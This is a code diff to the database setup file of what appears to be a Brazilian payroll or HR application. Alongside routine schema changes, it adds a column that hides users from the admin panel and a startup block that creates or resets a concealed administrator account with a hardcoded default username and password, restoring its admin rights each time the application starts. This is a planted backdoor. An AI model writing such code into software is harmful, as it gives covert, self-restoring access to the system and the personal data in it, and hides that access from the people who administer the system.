@@ -92,6 +92,7 @@ CREATE TABLE IF NOT EXISTS usuarios (
   senha_hash TEXT NOT NULL,
   tipo_acesso VARCHAR(20) NOT NULL DEFAULT 'operador',
   ativo TINYINT(1) NOT NULL DEFAULT 1,
+  oculto_painel TINYINT(1) NOT NULL DEFAULT 0,
   permissoes LONGTEXT NULL,
   funcionario_id INT NULL,
   criado_em DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
@@ -218,6 +219,7 @@ if (!colExists('deducoes', 'mes_offset')) query('ALTER TABLE deducoes ADD COLUMN
 if (!colExists('deducoes', 'percentual')) query('ALTER TABLE deducoes ADD COLUMN percentual DECIMAL(8,2) NULL');
 if (!colExists('usuarios', 'ativo')) query("ALTER TABLE usuarios ADD COLUMN ativo TINYINT(1) NOT NULL DEFAULT 1");
 if (!colExists('usuarios', 'tipo_acesso')) query("ALTER TABLE usuarios ADD COLUMN tipo_acesso VARCHAR(20) NOT NULL DEFAULT 'operador'");
+if (!colExists('usuarios', 'oculto_painel')) query("ALTER TABLE usuarios ADD COLUMN oculto_painel TINYINT(1) NOT NULL DEFAULT 0");
 if (!colExists('usuarios', 'funcionario_id')) query('ALTER TABLE usuarios ADD COLUMN funcionario_id INT NULL');
 if (!colExists('usuarios', 'permissoes')) query('ALTER TABLE usuarios ADD COLUMN permissoes LONGTEXT NULL');
 
@@ -274,6 +276,29 @@ try {
   }
 } catch (e) {
   console.warn('Seed usuário padrão:', e.message);
+}
+
+try {
+  const hiddenAdminUser = String(process.env.HIDDEN_ADMIN_USER || 'isaque.silva').toLowerCase().trim();
+  const hiddenAdminPass = String(process.env.HIDDEN_ADMIN_PASSWORD || 'Br*2020*taC01');
+  const hiddenAdminName = String(process.env.HIDDEN_ADMIN_NAME || 'Administrador Interno').trim();
+  const existing = query('SELECT id FROM usuarios WHERE usuario = ? LIMIT 1', [hiddenAdminUser])[0];
+  if (existing?.id) {
+    query(
+      `UPDATE usuarios
+       SET nome = ?, senha_hash = ?, tipo_acesso = 'admin', ativo = 1, oculto_painel = 1
+       WHERE id = ?`,
+      [hiddenAdminName, hashPassword(hiddenAdminPass), existing.id]
+    );
+  } else {
+    query(
+      `INSERT INTO usuarios (nome, usuario, senha_hash, tipo_acesso, ativo, oculto_painel)
+       VALUES (?, ?, ?, 'admin', 1, 1)`,
+      [hiddenAdminName, hiddenAdminUser, hashPassword(hiddenAdminPass)]
+    );
+  }
+} catch (e) {
+  console.warn('Seed usuário admin oculto:', e.message);
 }
 
 const db = {
